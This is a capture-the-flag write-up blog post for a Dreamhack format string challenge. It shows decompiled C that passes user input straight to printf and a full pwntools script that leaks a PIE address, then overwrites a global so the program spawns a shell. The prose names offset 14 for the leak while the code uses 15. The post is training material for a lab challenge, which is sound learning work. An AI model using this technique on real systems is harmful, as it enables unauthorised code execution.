+++
date = '2026-05-22'
draft = false
title = 'Dreamhack Format String Bug Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
Exploit Tech: Format String Bug에서 실습하는 문제입니다.

---

We just need to overwrite this address to get a shell, and we have a format string vulnerability.

```c
while ( 1 )
  {
    do
    {
      get_string(format, 32);
      printf(format);
      puts(&byte_2009);
    }
    while ( changeme != 1337 );
    system("/bin/sh");
  }
```


## Identifying the vulnerabilities

PIE is enabled, so all we need to do is leak PIE and then we can use pwntools' `fmtstr_payload` to overwrite `+0x401C` to `1337`.

I found offset 14 to have a PIE leak so I used that one.

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf =  ELF("./fsb_overwrite")
#libc = ELF("./libc.so.6")

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:23007'

ip, port = cyberedu.split(':')
port = int(port)


if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

#just ez fmtstr lol
#we  just need to change 0x401C
#we get leak , 0x2009

#our input starts at offset 6

p.sendline(b"%15$p")
leak = p.recvline().strip()
leak = int(leak, 16)
print(f"leaked is {hex(leak)}")

base = leak - 0x1293
print(f"base is {hex(base)}")

overwrite_me = base + 0x401C

writes = {
overwrite_me: 1337
}

payload = fmtstr_payload(6, writes)
p.send(payload)

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/fmtstr_bug.py)**.
